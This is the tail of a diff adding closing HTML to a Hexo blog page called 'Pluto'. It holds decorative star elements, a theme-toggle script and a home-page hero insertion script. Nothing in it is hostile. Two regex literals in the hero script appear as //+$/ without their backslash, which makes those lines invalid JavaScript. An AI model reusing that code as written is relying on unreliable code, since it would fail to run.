+  <span class="star" style="top:39.38736444979383%;left:70.7913531546372%;animation-delay:1.8452999358843691s;animation-duration:3.601180573757624s;width:1.2710313149246637px;height:1.2710313149246637px"></span><span class="star" style="top:7.298561385805968%;left:83.22758572153306%;animation-delay:0.8642029284969693s;animation-duration:2.309265454244667s;width:1.0901481908931525px;height:1.0901481908931525px"></span><span class="star" style="top:18.054118528626795%;left:96.23634624444082%;animation-delay:1.1765384030145076s;animation-duration:2.4360652929205853s;width:1.9443479870493539px;height:1.9443479870493539px"></span><span class="star" style="top:36.67431892762296%;left:83.34683373532306%;animation-delay:1.1778078715841245s;animation-duration:3.538773804477147s;width:1.7602920374570812px;height:1.7602920374570812px"></span><span class="star" style="top:2.1793607205678356%;left:21.90081757822151%;animation-delay:2.4091853361197906s;animation-duration:2.907418151602918s;width:2.185635266195352px;height:2.185635266195352px"></span><span class="star" style="top:11.341841251002528%;left:37.41746584861292%;animation-delay:3.667891009344637s;animation-duration:2.134498811518634s;width:1.298923346011038px;height:1.298923346011038px"></span><span class="star" style="top:64.97618696463819%;left:34.28129863755148%;animation-delay:0.5572717942084798s;animation-duration:2.01592419957794s;width:2.109620504571299px;height:2.109620504571299px"></span><span class="star" style="top:52.86104955749491%;left:23.589158352196193%;animation-delay:2.0821439141143934s;animation-duration:2.0119620598691568s;width:1.6450360456014237px;height:1.6450360456014237px"></span><span class="star" style="top:59.59597786490522%;left:54.86697531072938%;animation-delay:1.9410058658503586s;animation-duration:3.963065248807405s;width:1.4782968013993707px;height:1.4782968013993707px"></span><span class="star" style="top:75.92075115423769%;left:0.042934152245988066%;animation-delay:4.623293985945274s;animation-duration:2.538372548326789s;width:1.1612797715367984px;height:1.1612797715367984px"></span><span class="star" style="top:44.21279762642706%;left:27.65026299201889%;animation-delay:4.938203569487976s;animation-duration:2.0186437604097494s;width:1.0836972503728963px;height:1.0836972503728963px"></span><span class="star" style="top:57.38490359950409%;left:52.954722719581035%;animation-delay:4.789937064716068s;animation-duration:3.088879292271061s;width:1.5690277455059412px;height:1.5690277455059412px"></span><span class="star" style="top:95.55462289030304%;left:85.4660786355172%;animation-delay:1.0016060553422346s;animation-duration:4.2902153138005925s;width:1.5679864702643593px;height:1.5679864702643593px"></span><span class="star" style="top:59.0927625435887%;left:79.76250926038716%;animation-delay:3.8286242621009112s;animation-duration:3.044617885365179s;width:2.0522644250001028px;height:2.0522644250001028px"></span><span class="star" style="top:9.98072564810174%;left:12.36451518447399%;animation-delay:3.2255802374636335s;animation-duration:2.692586245384439s;width:1.8167498260905093px;height:1.8167498260905093px"></span><span class="star" style="top:51.219549187767164%;left:94.11723579028832%;animation-delay:0.5538460232942022s;animation-duration:4.1977828766147205s;width:2.3319943429777785px;height:2.3319943429777785px"></span><span class="star" style="top:87.64956857682833%;left:44.07243076183443%;animation-delay:0.1878694286228777s;animation-duration:4.471537829841896s;width:2.4360307779334px;height:2.4360307779334px"></span><span class="star" style="top:24.017013355010143%;left:86.05824802683092%;animation-delay:4.296366113247131s;animation-duration:4.313450251045926s;width:1.3825991227330783px;height:1.3825991227330783px"></span><span class="star" style="top:11.658794898336588%;left:87.04234968182246%;animation-delay:2.5572814091178135s;animation-duration:4.926907890441987s;width:2.2554221768647538px;height:2.2554221768647538px"></span><span class="star" style="top:4.910554134998524%;left:70.82620186280384%;animation-delay:1.0961195869989142s;animation-duration:3.7035260592636794s;width:1.1249182941842346px;height:1.1249182941842346px"></span><span class="star" style="top:51.78837779013836%;left:31.447205006542035%;animation-delay:4.247260124838573s;animation-duration:3.353938333446137s;width:1.5080211136785677px;height:1.5080211136785677px"></span><span class="star" style="top:39.626100673139334%;left:0.503363578787408%;animation-delay:2.4318588355737623s;animation-duration:2.458347447462531s;width:2.2690733394354394px;height:2.2690733394354394px"></span><span class="star" style="top:44.56793729079702%;left:93.20890028385932%;animation-delay:1.5093212243288534s;animation-duration:2.5895157702064315s;width:1.9372959516476072px;height:1.9372959516476072px"></span><span class="star" style="top:31.670510613729075%;left:47.32708594758619%;animation-delay:1.56575886548525s;animation-duration:4.076490614842986s;width:1.5289916512754482px;height:1.5289916512754482px"></span><span class="star" style="top:57.8459918214954%;left:66.79947848094677%;animation-delay:2.6141206798236594s;animation-duration:3.569203537418786s;width:1.6892992360450176px;height:1.6892992360450176px"></span><span class="star" style="top:30.985161619560152%;left:91.96840308175834%;animation-delay:4.8490282064401775s;animation-duration:2.154109758433261s;width:1.0189514092714926px;height:1.0189514092714926px"></span><span class="star" style="top:93.2075605032744%;left:26.534625063268603%;animation-delay:4.889548027796472s;animation-duration:4.736474864482852s;width:1.1828731984824659px;height:1.1828731984824659px"></span><span class="star" style="top:21.931288324860866%;left:55.98973819365178%;animation-delay:3.400715648713635s;animation-duration:4.240772707148469s;width:1.4042937163005125px;height:1.4042937163005125px"></span><span class="star" style="top:71.41840817003595%;left:99.31005295670094%;animation-delay:4.867535051534718s;animation-duration:3.0104726495375838s;width:2.468697786551029px;height:2.468697786551029px"></span><span class="star" style="top:14.999169622015106%;left:46.47295075507466%;animation-delay:3.9760980640035064s;animation-duration:3.6361475758609147s;width:2.243534251267011px;height:2.243534251267011px"></span><span class="star" style="top:30.547428950257327%;left:45.35925304947579%;animation-delay:1.5492412203374823s;animation-duration:3.727903243493127s;width:2.214337600715222px;height:2.214337600715222px"></span><span class="star" style="top:23.04744009413161%;left:35.7605062285285%;animation-delay:3.5436694833695412s;animation-duration:3.582986264441831s;width:2.203817605297753px;height:2.203817605297753px"></span><span class="star" style="top:94.2694631963614%;left:0.7847099633429222%;animation-delay:0.4043632184244722s;animation-duration:2.279397131943446s;width:2.080531429761433px;height:2.080531429761433px"></span><span class="star" style="top:61.1543321605331%;left:30.785970862927712%;animation-delay:4.044030972986396s;animation-duration:4.3919322386433635s;width:2.099921117066967px;height:2.099921117066967px"></span><span class="star" style="top:25.926377902920084%;left:98.6240270367659%;animation-delay:2.85298298163877s;animation-duration:2.5003186234019337s;width:2.1417971512960587px;height:2.1417971512960587px"></span><span class="star" style="top:48.67803551925882%;left:17.671997262659833%;animation-delay:3.29130349946166s;animation-duration:3.600416201892405s;width:1.270014057421838px;height:1.270014057421838px"></span><span class="star" style="top:52.6826158331453%;left:61.15082745683824%;animation-delay:2.1496435728668146s;animation-duration:2.366129730447483s;width:1.3761954053933372px;height:1.3761954053933372px"></span><span class="star" style="top:52.18518798105378%;left:16.005777443529446%;animation-delay:0.30961513509197125s;animation-duration:3.4617550957187797s;width:1.7578000329877308px;height:1.7578000329877308px"></span><span class="star" style="top:40.935559065058335%;left:19.42312531866268%;animation-delay:1.0586955753933913s;animation-duration:4.328691275644612s;width:1.7548282334929701px;height:1.7548282334929701px"></span><span class="star" style="top:14.210800920574728%;left:63.18173432034121%;animation-delay:1.5752845012336403s;animation-duration:3.7279861156274587s;width:1.3222284241430908px;height:1.3222284241430908px"></span><span class="star" style="top:19.99873624740529%;left:61.00081922004187%;animation-delay:4.646870053693533s;animation-duration:2.204069749458334s;width:1.0745816716602392px;height:1.0745816716602392px"></span><span class="star" style="top:96.27522135372011%;left:98.03882838290251%;animation-delay:1.0410012159336852s;animation-duration:2.5844658591027567s;width:2.385487182697788px;height:2.385487182697788px"></span><span class="star" style="top:33.79671029659891%;left:90.5078692948742%;animation-delay:1.8663471534905374s;animation-duration:3.2970146554012576s;width:1.6705667846764862px;height:1.6705667846764862px"></span><span class="star" style="top:90.3151033404105%;left:20.270426880099023%;animation-delay:3.293172410455019s;animation-duration:4.955723310707901s;width:1.5158510296677319px;height:1.5158510296677319px"></span><span class="star" style="top:69.73657713822445%;left:99.24762344997579%;animation-delay:1.4131790511467723s;animation-duration:2.8778927279149453s;width:2.260118574185218px;height:2.260118574185218px"></span><span class="star" style="top:0.9203627585219865%;left:95.42077933781206%;animation-delay:2.7597340832450614s;animation-duration:3.280695466693378s;width:2.10194379562793px;height:2.10194379562793px"></span><span class="star" style="top:10.581943872787402%;left:59.73503887325139%;animation-delay:0.28053614689515727s;animation-duration:2.901962465962005s;width:1.626548676008046px;height:1.626548676008046px"></span><span class="star" style="top:28.925042417128676%;left:95.38353480394991%;animation-delay:1.2732225634944294s;animation-duration:4.009030742257543s;width:2.478532150880464px;height:2.478532150880464px"></span><span class="star" style="top:0.8874336949255435%;left:35.64967686847408%;animation-delay:1.3730937971155044s;animation-duration:4.619213852883883s;width:1.5863548502343778px;height:1.5863548502343778px"></span><span class="star" style="top:38.74620015909195%;left:58.177025047991215%;animation-delay:4.534817412358385s;animation-duration:3.338835737198423s;width:2.2266428996473127px;height:2.2266428996473127px"></span><span class="star" style="top:28.55005163898372%;left:45.6918538929626%;animation-delay:2.509475833469257s;animation-duration:4.6342958495648965s;width:2.234765594394048px;height:2.234765594394048px"></span><span class="star" style="top:60.23137160837781%;left:93.06597293854331%;animation-delay:0.9876872753320737s;animation-duration:4.204366819059004s;width:1.257419582497417px;height:1.257419582497417px"></span><span class="star" style="top:8.383852360531908%;left:98.98620564474818%;animation-delay:2.3594615255974665s;animation-duration:3.195690830659082s;width:1.41532975632345px;height:1.41532975632345px"></span><span class="star" style="top:7.059111584403476%;left:16.640764400983933%;animation-delay:0.07739200138113578s;animation-duration:4.022415825141789s;width:1.5917635790161893px;height:1.5917635790161893px"></span><span class="star" style="top:12.302706720223789%;left:31.549503433835223%;animation-delay:3.5691696243070847s;animation-duration:2.5387187462852507s;width:1.4019744171802817px;height:1.4019744171802817px"></span><span class="star" style="top:88.12034767838924%;left:54.281475393816194%;animation-delay:3.9594582511401772s;animation-duration:4.059274174213815s;width:1.5401037734781327px;height:1.5401037734781327px"></span><span class="star" style="top:48.014396871115665%;left:45.606795792813216%;animation-delay:2.66217501462761s;animation-duration:3.561960628862946s;width:1.9984232760377132px;height:1.9984232760377132px"></span><span class="star" style="top:94.53738765593707%;left:71.73374815656867%;animation-delay:4.549702213467475s;animation-duration:4.553483912789519s;width:1.8038222288485768px;height:1.8038222288485768px"></span><span class="star" style="top:69.30271245658159%;left:48.56849033685236%;animation-delay:0.954844946653004s;animation-duration:2.7161428132101073s;width:1.0615204029043628px;height:1.0615204029043628px"></span><span class="star" style="top:54.47530430233921%;left:46.870791491218874%;animation-delay:4.141749834007648s;animation-duration:2.5597432426006907s;width:1.943870309873099px;height:1.943870309873099px"></span>
+  <div class="shooting-star" style="top:10%;left:70%;animation-delay:-1s"></div>
+  <div class="shooting-star" style="top:25%;left:40%;animation-delay:-3s"></div>
+</div>
+<button class="theme-toggle" id="plutoThemeToggle" aria-label="Toggle dark mode" title="切换日/夜模式">🌙</button>
+<script>
+(function(){
+  var saved = localStorage.getItem('pluto-theme');
+  var btn = document.getElementById('plutoThemeToggle');
+  var prefersDark = window.matchMedia('(prefers-color-scheme: dark)').matches;
+  var theme = saved || (prefersDark ? 'dark' : 'light');
+  apply(theme);
+  btn.addEventListener('click', function(){
+    theme = theme === 'dark' ? 'light' : 'dark';
+    localStorage.setItem('pluto-theme', theme);
+    apply(theme);
+  });
+  function apply(t){
+    document.documentElement.setAttribute('data-theme', t);
+    btn.textContent = t === 'dark' ? '☀️' : '🌙';
+    document.body.style.colorScheme = t === 'dark' ? 'dark' : 'light';
+  }
+})();
+</script>
+<script>
+(function(){
+  var root = '/Myblog/';
+  var path = window.location.pathname.replace(//+$/, '');
+  var rootPath = root.replace(//+$/, '');
+  var isHome = (path === rootPath) || (path === '') || (path === '/');
+  if (isHome) {
+    var main = document.querySelector('main.column') || document.querySelector('#main') || document.querySelector('.columns.is-desktop') || document.querySelector('main');
+    if (main) {
+      var hero = document.createElement('div');
+      hero.className = 'pluto-hero';
+      hero.innerHTML = '<img class="pluto-avatar" src="' + root + 'img/avatar.jpg?v=2" alt="Pluto">' +
+        '<h1>Pluto</h1>' +
+        '<p class="pluto-tagline">Hack the planet. Explore the unknown.</p>';
+      main.parentNode.insertBefore(hero, main);
+    }
+  }
+})();
+</script>
+<script src="/Myblog/js/pluto-cursor.js"></script>
+<!-- hexo injector body_end end --></body></html>
